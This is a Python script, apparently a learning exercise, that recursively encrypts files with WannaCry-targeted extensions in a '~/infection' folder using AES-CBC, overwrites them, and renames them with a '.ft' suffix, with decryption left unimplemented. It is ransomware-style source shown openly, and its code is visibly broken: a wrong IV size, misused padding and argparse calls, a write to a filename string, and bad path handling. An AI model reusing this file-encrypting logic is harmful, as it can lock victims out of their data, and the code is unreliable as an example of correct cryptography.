import argparse
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

VERSION = '1.0.0'
EXTESNIONS = open("wannacry_extension.txt", 'r').readlines()

def get_key(path):
    try:
        with open(path, 'r') as file:
            key = file.read()
            if len(key) < 16 or len(key) > 32:
                raise Exception('Key lenght has to be at lesat 16 bytes and maximum 32')
            return key.encode().ljust(32, b'\0')[:32]
    except Exception as e:
        print(e)
        exit(1)

def decrypt_files(file,args):
    print('Not done yet')

def encrypt(file, args):
    key = get_key(args.KEY)
    iv = os.urandom(32)
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    try:
        with open(file, 'rb') as f:
            plaintext = f.read()
        ciphertext = iv + cipher.encrypt(pad(plaintext, AES))
        with open(file , 'wb') as f:
            file.write(ciphertext)
            new = os.path.join(file, '.ft')
            os.rename(file, new)
    except Exception as e:
        print(f'{file}: {e}')

def encrypt_files(dir, args):
    for file in os.listdir(dir):
        if os.path.isdir(file):
            encrypt_files(file, args)
        else:
            if file.endswith(EXTESNIONS):
                encrypt(file, args)

def main():
    parser = argparse.ArgumentParser(description="Encrypt/decrypt file types infected by wannacry virus")
    parser.add_argument('-v', action='store_true', default=False, help='Display version of the program')
    parser.add_argument('-r',action='store_true', default=False, help='Reverse the infection')
    parser.add_argument('-s', action='store_true', default=False, help='No output for encryption')
    parser.add_argument('KEY', type=os.path, help='Encryption/decrytion key path')
    args = parser.parse_args()

    if not os.path.isfile(args.KEY):
        parser.error(f'{args.KEY} doesn\'t exist')
    if args.r == True:
        decrypt_files('~/infection',args)
    else:
        encrypt_files('~/infection', args)

if __name__ == "__main__":
    main()
